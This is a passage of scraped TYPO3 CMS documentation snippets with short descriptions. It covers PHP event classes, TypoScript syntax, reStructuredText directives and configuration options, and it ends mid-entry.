https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SymfonyExpressionLanguage/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nclass CustomTypoScriptConditionProvider extends AbstractProvider\n{\n    public function __construct()\n    {\n        $this->expressionLanguageProviders = [\n            CustomConditionFunctionsProvider::class,\n        ];\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring X-Redirect-By Header Exposure in TYPO3 CMS\nDESCRIPTION: This PHP snippet shows how to enable the exposure of page ID in the X-Redirect-By header. It's a global configuration option that should only be enabled for debugging purposes as it exposes internal information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/RedirectHeaders.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['FE']['exposeRedirectInformation']\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFileContentsSetEvent Class in TYPO3 Core Resource System (PHP)\nDESCRIPTION: Documentation of the BeforeFileContentsSetEvent class in the TYPO3 Core Resource system. This event is fired before file contents are set or replaced, allowing for content analysis or modification before being written by the driver.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFileContentsSetEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeFileContentsSetEvent\n{\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface\n    {\n        // Returns the file object\n    }\n\n    public function getContent(): string\n    {\n        // Returns the content as string\n    }\n\n    public function setContent(string $content)\n    {\n        // Sets the content\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PHP Error Using Named Arguments and Inheritance\nDESCRIPTION: This snippet illustrates the potential error when using named arguments with inheritance in PHP, emphasizing best practices in design.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/NamedArguments.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\ninterface I {\n    public function test($foo, $bar);\n}\n\nclass C implements I {\n    public function test($a, $b) {}\n}\n\n$obj = new C();\n\n// Pass params according to I::test() contract\n$obj->test(foo: \"foo\", bar: \"bar\"); // ERROR!\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variable to Disable TYPO3 Core Updater\nDESCRIPTION: Sets an environment variable to disable the Core Updater functionality in TYPO3. This prevents users from using the built-in update mechanism, which might be desirable when using custom update processes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Legacy/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: none\nCODE:\n```\nTYPO3_DISABLE_CORE_UPDATER=1\n```\n\n----------------------------------------\n\nTITLE: Fetching Language Packs via Command Line in Legacy TYPO3 Installation\nDESCRIPTION: Command to update language packs through the command line interface in a legacy TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 language:update\n```\n\n----------------------------------------\n\nTITLE: Adding Files to Subfolder in TYPO3 FAL\nDESCRIPTION: Shows how to add a file to a specific subfolder in the storage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$storage = $resourceFactory->getDefaultStorage();\n$folder = $storage->getFolder('some/nested/folder/');\n$newFile = $storage->addFile(\n    '/tmp/temporary_file.ext',\n    $folder,\n    'final_file_name.ext'\n);\n```\n\n----------------------------------------\n\nTITLE: SQL DELETE Condition Example\nDESCRIPTION: An SQL condition example showing how deleted records are filtered in TYPO3 database queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ClassOverview/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: SQL\nCODE:\n```\ndeleted=0\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition for RTE HTML Transformation Event\nDESCRIPTION: Defines an event class that is triggered after RteHtmlParser modifies HTML input from the RTE editor before database storage. Includes methods for getting and setting HTML content and processing configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Html/AfterTransformTextForPersistenceEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Html\\Event;\n\nclass AfterTransformTextForPersistenceEvent {\n    public function getHtmlContent(): string\n    public function setHtmlContent(string $htmlContent)\n    public function getInitialHtmlContent(): string\n    public function getProcessingConfiguration(): array\n}\n```\n\n----------------------------------------\n\nTITLE: Adding 'See Also' Section in TYPO3 Documentation\nDESCRIPTION: This RST directive adds a 'See Also' section with a reference to the privileges documentation in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: rst\nCODE:\n```\n..  seealso::\n\n    See section :ref:`privileges` for more information on\n    special backend user roles \"admin\" and \"system maintainers\".\n```\n\n----------------------------------------\n\nTITLE: Including File Storage Access Screenshot in reST Documentation\nDESCRIPTION: reST directive for including a screenshot of the TYPO3 file storage access capabilities configuration tab, with shadow styling applied.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Fal/AdministrationFileStorageAccessTab.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Fal/AdministrationFileStorageAccessTab.png\n   :class: with-shadow\n\n   Special properties in the \"Access capabilities\" tab of a File storage\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Backend Live Search Event Class Definition\nDESCRIPTION: PHP class definition for BeforeLiveSearchFormIsBuiltEvent that implements PSR-14 event interface for modifying TYPO3 backend live search form behavior. The class provides methods for managing search hints, handling search demands, and customizing view data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/BeforeLiveSearchFormIsBuiltEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Search\\Event;\n\nclass BeforeLiveSearchFormIsBuiltEvent {\n    public function getHints(): array;\n    public function setHints(array $hints): void;\n    public function addHint(string $label): void;\n    public function addHints(string ...$labels): void;\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    public function getSearchDemand(): \\TYPO3\\CMS\\Backend\\Search\\LiveSearch\\SearchDemand\\SearchDemand;\n    public function setSearchDemand(\\TYPO3\\CMS\\Backend\\Search\\LiveSearch\\SearchDemand\\SearchDemand $searchDemand): void;\n    public function getAdditionalViewData(): array;\n    public function setAdditionalViewData(array $viewData): void;\n}\n```\n\n----------------------------------------\n\nTITLE: Modifying Record List Actions in TYPO3 Backend PHP Class\nDESCRIPTION: PHP class definition for ModifyRecordListTableActionsEvent that handles table actions in TYPO3's RecordList. The class provides methods to manage action items, their positions, and labels for the record list interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListTableActionsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\RecordList\\Event;\n\nclass ModifyRecordListTableActionsEvent\n{\n    public function setAction(string $action, string $actionName = '', string $before = '', string $after = '')\n    {\n        // Add or override action with positioning\n    }\n\n    public function hasAction(string $actionName): bool\n    {\n        // Check if action exists\n    }\n\n    public function getAction(string $actionName): ?string\n    {\n        // Get action by name\n    }\n\n    public function removeAction(string $actionName): bool\n    {\n        // Remove action by name\n    }\n\n    public function setActions(array $actions)\n    {\n        // Set multiple actions\n    }\n\n    public function getActions(): array\n    {\n        // Get all actions\n    }\n\n    public function setNoActionLabel(string $noActionLabel)\n    {\n        // Set label for no action case\n    }\n\n    public function getNoActionLabel(): string\n    {\n        // Get no action label\n    }\n\n    public function getTable(): string\n    {\n        // Get current table\n    }\n\n    public function getRecordIds(): array\n    {\n        // Get record IDs\n    }\n\n    public function getRecordList(): \\TYPO3\\CMS\\Backend\\RecordList\\DatabaseRecordList\n    {\n        // Get DatabaseRecordList instance\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Commenting in TypoScript\nDESCRIPTION: This snippet demonstrates different ways to use comments in TypoScript. It includes single-line comments using `#` and `//`, multi-line comments with `/* ... */`, and illustrates how comments can appear alongside variable assignments while properly not affecting the value being assigned. These examples are crucial for structuring configuration files in TYPO3 effectively.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/Comments.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n# This is a comment\n// This is a comment\n/* This is a\n   multiline comment */\n\nfoo < bar // This is a comment\nfoo < bar /* This is a valid comment, too */\n\nfoo > # Another valid comment\n\nfoo := addToList(1) # Yes, a comment\n\n[foo = bar] # Many comment. Much wow.\n\nfoo (\n  # This is NOT a comment but part of the value assignment!\n  bar = barValue\n) # This is a comment\n\nfoo = bar // This is NOT a comment but part of the value assignment!\n```\n\n----------------------------------------\n\nTITLE: RST Index Entry for Doctrine ORM\nDESCRIPTION: RST index directive for Doctrine ORM documentation\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Introduction/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: RST\nCODE:\n```\n..  index:: Doctrine; ORM\n```\n\n----------------------------------------\n\nTITLE: XML Equivalent of TypoScript Bulletlist Configuration\nDESCRIPTION: Demonstrates how the same TypoScript configuration would be represented in a hypothetical XML markup language, highlighting verbosity and complexity\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/TypoScript/MythsFaq/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<TSML syntax=\"3\">\n  <styles>\n    <content>\n      <bulletlist>\n        TEXT\n        <stdWrap>\n          <current>1</current>\n          <trim>1</trim>\n          <if>\n            <isTrue>\n              <current>1</current>\n            </isTrue>\n          </if>\n          <!-- Copying the object \"styles.content.parseFunc\" to this position -->\n          <parseFunc copy=\"styles.content.parseFunc\"/>\n          <split>\n            <token>\n              <char>10</char>\n            </token>\n            <cObjNum>1</cObjNum>\n            <num:1>\n              <current>1</current>\n              <wrap>&lt;li&gt;</wrap>\n            </num:1>\n          </split>\n          <!-- Setting wrapping value: -->\n          <fontTag>&lt;ol type=&quot;1&quot;&gt; | &lt;/ol&gt;</fontTag>\n          <textStyle>\n            <altWrap>{$styles.content.bulletlist.altWrap}</altWrap>\n          </textStyle>\n        </stdWrap>\n      </bulletlist>\n    </content>\n  </styles>\n</TSML>\n```\n\n----------------------------------------\n\nTITLE: Checking Propagation Status in BeforeFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns a boolean indicating whether the event propagation has been stopped.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_7\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: isPropagationStopped()\n    :returns: `bool`\n```\n\n----------------------------------------\n\nTITLE: BeforeRecordIsAnalyzedEvent API in PHP\nDESCRIPTION: This code snippet shows the PHP interface for the BeforeRecordIsAnalyzedEvent, including its available methods for accessing and modifying event data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent.rst#2025-04-16_snippet_5\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class BeforeRecordIsAnalyzedEvent\n{\n    public function __construct(\n        private array $results,\n        private readonly string $recordType,\n        private readonly array $record\n    ) {\n    }\n\n    public function getResults(): array\n    {\n        return $this->results;\n    }\n\n    public function setResults(array $results): void\n    {\n        $this->results = $results;\n    }\n\n    public function getRecordType(): string\n    {\n        return $this->recordType;\n    }\n\n    public function getRecord(): array\n    {\n        return $this->record;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Inserting Figure for Backend User Actions in TYPO3 Documentation\nDESCRIPTION: This RST directive inserts a figure showing the backend user action buttons in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: rst\nCODE:\n```\n..  figure:: /Images/ManualScreenshots/UserManagement/Module/BackendUserActions.png\n    Overview of buttons in the entry of a non-admin backend user\n```\n\n----------------------------------------\n\nTITLE: Including Screenshot in RST Documentation\nDESCRIPTION: RST directive for including a screenshot showing clipboard dump in the TYPO3 debug window, with shadow effect styling applied.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/Clipboard/ClipboardDump.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/Clipboard/ClipboardDump.png\n   :class: with-shadow\n\n   A dump of the clipboard in the debug window\n```\n\n----------------------------------------\n\nTITLE: Displaying Another Incorrect Folder Structure for TYPO3 Root\nDESCRIPTION: This code snippet demonstrates another example of an incorrect folder structure for a TYPO3 installation. In this case, the web root is nested too deeply, which can cause security issues and file resolution problems in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/Requirements.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ tree typo3_root\n└── cms/ (web root)\n    └── public/\n        ├── index.php\n        ├── fileadmin/\n        ├── typo3/\n        ├── typo3conf/\n        └── typo3temp/\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for TYPO3 Extbase Configuration\nDESCRIPTION: ReStructuredText markup defining the documentation structure for Extbase configuration events, including includes, index pairs, and table of contents directives.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Configuration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Extbase Configuration\n..  _eventlist-extbase-configuration:\n\n=============\nConfiguration\n=============\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:extbase, namespace Configuration.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Including reStructuredText Header and Index Configuration\nDESCRIPTION: Configuration directives for including common definitions and setting up index entries for the lowlevel events documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Lowlevel/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; lowlevel\n..  _eventlist-lowlevel:\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Image Directive for TYPO3 Backend Screenshot\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of the TYPO3 backend user simulation interface with proper styling and caption\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AccessControl/SimulatedUser.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: reST\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AccessControl/SimulatedUser.png\n   :class: with-shadow\n\n   Backend with active simulate user\n```\n\n----------------------------------------\n\nTITLE: Using GravatarViewHelper with Inline Notation (HTML)\nDESCRIPTION: Example of using the GravatarViewHelper with inline notation in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_7\n\nLANGUAGE: HTML\nCODE:\n```\n{m:gravatar(emailAddress: post.author.emailAddress)}\n```\n\n----------------------------------------\n\nTITLE: Displaying Category Screenshot with Parent Relationship in RST\nDESCRIPTION: ReStructuredText markup for displaying a screenshot of TYPO3's category editing interface, including figure directive with shadow styling class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Categories/Editing.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Categories/Editing.png\n   :class: with-shadow\n\n   A category with a parent defined\n```\n\n----------------------------------------\n\nTITLE: Page TSconfig File Configuration\nDESCRIPTION: Convention for defining page TSconfig files in TYPO3 extensions with .tsconfig file extension, located in Configuration/TsConfig/Page directory\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/TsConfig/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  typo3:file:: something.tsconfig\n    :scope: extension\n    :path: /Configuration/TsConfig/Page\n    :regex: /^.*Configuration\\/TsConfig\\/Page\\/.*\\.tsconfig$/\n    :shortDescription: Contains page TSconfig files. The path is convention, the files must end on .tsconfig.\n```\n\n----------------------------------------\n\nTITLE: TSConfig for Single Page Storage\nDESCRIPTION: TypoScript configuration for setting a single page storage ID.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_6\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEFORM.tt_content.myextension_reference.PAGE_TSCONFIG_ID = 42\n```\n\n----------------------------------------\n\nTITLE: Importing TypoScript from an Extension (TypoScript)\nDESCRIPTION: This code snippet demonstrates how to import TypoScript code from an extension using the `@import` statement within a TypoScript configuration file. The `@import` directive is used to include TypoScript from the specified path, allowing for modularity and reusability. The path should be relative to the root of the TYPO3 installation and specify the extension key and file path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/CodeBlockInvalidImport.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n.. code-block:: typoscript\n   :caption: Extension examples, file Configuration/TypoScript/Syntax/CodeBlockInvalidCondition/setup.typoscript\n\n   myIdentifier = TEXT\n   myIdentifier {\n      @import 'EXT:my_extension/Configuration/TypoScript/bar.typoscript'\n      value = foo\n   }\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for TCA Configuration Screenshot\nDESCRIPTION: ReStructuredText directive for including and formatting a screenshot that shows TCA field verification in the TYPO3 Configuration module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/ExtendingTca/VerifyingTca.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/ExtendingTca/VerifyingTca.png\n   :class: with-shadow\n\n   Checking the existence of the new field via the Configuration module\n```\n\n----------------------------------------\n\nTITLE: Using groupBy in TYPO3 Query Builder (PHP)\nDESCRIPTION: Demonstrates how to use the groupBy method to add GROUP BY clauses to a SELECT statement. The example groups results by pages.sys_language_uid and sys_language.uid fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_22\n\nLANGUAGE: php\nCODE:\n```\n// GROUP BY `pages`.`sys_language_uid`, `sys_language`.`uid`\n->groupBy('pages.sys_language_uid', 'sys_language.uid');\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyDatabaseQueryForRecordListingEvent PHP Class Methods\nDESCRIPTION: Definition of methods available in the ModifyDatabaseQueryForRecordListingEvent class for modifying database queries in TYPO3 CMS backend. These methods provide access to query parameters and allow modification of the query builder instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyDatabaseQueryForRecordListingEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\View\\Event;\n\nclass ModifyDatabaseQueryForRecordListingEvent {\n    public function getQueryBuilder(): \\TYPO3\\CMS\\Core\\Database\\Query\\QueryBuilder;\n    public function setQueryBuilder(\\TYPO3\\CMS\\Core\\Database\\Query\\QueryBuilder $queryBuilder);\n    public function getTable(): string;\n    public function getPageId(): int;\n    public function getFields(): array;\n    public function getFirstResult(): int;\n    public function getMaxResults(): int;\n    public function getDatabaseRecordList(): \\TYPO3\\CMS\\Backend\\RecordList\\DatabaseRecordList;\n}\n```\n\n----------------------------------------\n\nTITLE: Backend Controller Hook Implementation for TYPO3\nDESCRIPTION: PHP class implementation for a backend controller hook that loads custom JavaScript to handle broadcast messages. Uses the PageRenderer to include the JavaScript file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BroadcastChannels.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Hooks;\n\nuse TYPO3\\CMS\\Backend\\Controller\\BackendController;\nuse TYPO3\\CMS\\Core\\Page\\PageRenderer;\n\n/**\n * Hook for the backend controller\n */\nclass BackendControllerHook\n{\n    private PageRenderer $pageRenderer;\n\n    public function __construct(PageRenderer $pageRenderer)\n    {\n        $this->pageRenderer = $pageRenderer;\n    }\n\n    /**\n     * @param array $configuration\n     * @param BackendController $backendController\n     */\n    public function registerClientSideEventHandler(array $configuration, BackendController $backendController): void\n    {\n        $this->pageRenderer->loadJavaScriptModule('@myvendor/my-extension/my-event-handler.js');\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Including Screenshot with RST Directives\nDESCRIPTION: RST code snippet that embeds a screenshot from the Examples module showing two links. The image is configured with a shadow effect using the 'with-shadow' class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/EditLinks/EditLinksDisplay.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/EditLinks/EditLinksDisplay.png\n   :class: with-shadow\n\n   The two links in the Examples module\n```\n\n----------------------------------------\n\nTITLE: TypoScript Constants Configuration\nDESCRIPTION: Optional file containing TypoScript constants for the site when using site as a TypoScript provider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/SiteFolder.rst#2025-04-16_snippet_3\n\nLANGUAGE: typoscript\nCODE:\n```\nconstants.typoscript\n```\n\n----------------------------------------\n\nTITLE: Defining RTE Transformation Filter: css_transform\nDESCRIPTION: Defines the css_transform filter which transforms HTML markup for display in the RTE or saving to the database. It's noted that the name is historical, as it replaced an older 'ts_transform' mode.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/Transformations/Overview.rst#2025-04-16_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. confval:: css_transform\n\n   :Scope: RTE Transformation filter\n\n   Transforms the HTML markup either for display in the rich-text editor or for\n   saving in the database. The name \"css_transform\" is historical; earlier\n   TYPO3 versions had a long since removed \"ts_transform\" mode, which basically\n   only saved a minimum amount of HTML in the database and produced a lot of\n   nowadays outdated markup like :code:`<font>` tag style rendering in the\n   frontend.\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforeStdWrapContentStoredInCacheEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for the BeforeStdWrapContentStoredInCacheEvent in TYPO3. This listener can manipulate the content, cache tags, cache key, and lifetime before stdWrap content is stored in cache.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/BeforeStdWrapContentStoredInCacheEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Frontend\\EventListener;\n\nuse TYPO3\\CMS\\Frontend\\ContentObject\\Event\\BeforeStdWrapContentStoredInCacheEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeStdWrapContentStoredInCacheEvent $event): void\n    {\n        // Change the content to be stored in the cache\n        $event->setContent($event->getContent() . ' altered');\n\n        // Add an additional tag\n        $event->addTag('tag_' . $event->getKey());\n\n        // Change the cache lifetime\n        $event->setLifetime(3600);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating ModuleData Instance from Module and Data\nDESCRIPTION: This method creates a new ModuleData instance from a given module and data array. It returns a new instance of the class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: createFromModule(\\TYPO3\\CMS\\Backend\\Module\\ModuleInterface $module, array $data)\n        :returns: `self`\n\n        :param $module: the module\n        :param $data: the data\n```\n\n----------------------------------------\n\nTITLE: Configuring Haiku Record Link Handler in TYPO3 TSConfig\nDESCRIPTION: Defines a custom link handler configuration for Haiku records using TYPO3's RecordLinkHandler. The configuration specifies the handler class, label path, target table, and position in the link browser menu.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/LinkBrowser/Classes/HaikuRecordLinkBrowserTsconfig.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler {\n    haiku {\n        handler = TYPO3\\CMS\\Recordlist\\LinkHandler\\RecordLinkHandler\n        label = LLL:EXT:examples/Resources/Private/Language/locallang_browse_links.xlf:haiku\n        configuration {\n            table = tx_examples_haiku\n        }\n        displayAfter = url\n        scanBefore = page\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Content Element Plugin in TYPO3 CMS using PHP\nDESCRIPTION: This code snippet registers a new plugin named 'PostSingle' for the 'blog_example' extension in TYPO3 CMS. It uses the ExtensionUtility::registerPlugin() method to add the plugin to the content element wizard.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/FrontendPlugins/RegisterPlugin.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nuse TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility;\n\ndefined('TYPO3') or die();\n\nExtensionUtility::registerPlugin(\n    'blog_example',\n    'PostSingle',\n    'Single Post (BlogExample)'\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring Additional File Access Paths in TYPO3 CMS\nDESCRIPTION: This PHP code snippet demonstrates how to configure additional directories outside of the project's folder for file access in TYPO3 CMS. It uses the $GLOBALS['TYPO3_CONF_VARS']['BE']['lockRootPath'] setting to specify absolute paths for shared document and image directories.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Administration/Storages.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// Configure additional directories outside of the project's folder\n// as absolute paths\n$GLOBALS['TYPO3_CONF_VARS']['BE']['lockRootPath'] = [\n    '/var/shared/documents/',\n    '/var/shared/images/',\n];\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeImportEvent Class Methods in TYPO3 CMS\nDESCRIPTION: Definition of BeforeImportEvent class with methods getImport() and getFile() for handling import events. The class is triggered before a file import operation and provides access to the Import object and file path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Impexp/BeforeImportEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Impexp\\Event;\n\nclass BeforeImportEvent\n{\n    public function getImport(): \\TYPO3\\CMS\\Impexp\\Import\n    {\n        // Returns the Import object\n    }\n\n    public function getFile(): string\n    {\n        // Returns the file path being imported\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Event Handling with lit-html\nDESCRIPTION: Demonstrates how to bind event handlers using the @ prefix in lit-html templates.\nSOURCE: 